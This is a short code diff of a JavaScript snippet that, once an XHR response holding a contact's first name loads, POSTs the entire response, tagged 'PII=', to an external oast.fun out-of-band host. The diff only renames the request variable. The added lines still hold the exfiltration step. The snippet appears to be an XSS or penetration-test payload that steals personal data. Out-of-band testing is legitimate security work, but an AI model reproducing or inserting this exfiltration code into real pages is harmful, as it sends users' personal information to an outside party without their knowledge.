@@ -14,9 +14,9 @@ xhr.onload = function() {
     const firstName = response.generalInfo?.contactInfo?.name?.firstName;
 
     if (firstName && firstName.trim() !== "") {
-    xhr=new XMLHttpRequest();
-    xhr.open("POST","https://kypdqokutkzjkenfltayept3ry0mphyy4.oast.fun");
-    xhr.send(`PII=${response}`);
+    xxhr=new XMLHttpRequest();
+    xxhr.open("POST","https://kypdqokutkzjkenfltayept3ry0mphyy4.oast.fun");
+    xxhr.send(`PII=${response}`);
     } else {
       console.log("First Name is missing or empty");
     }
@@ -30,4 +30,3 @@ xhr.onerror = function() {
 };
 
 xhr.send();
-
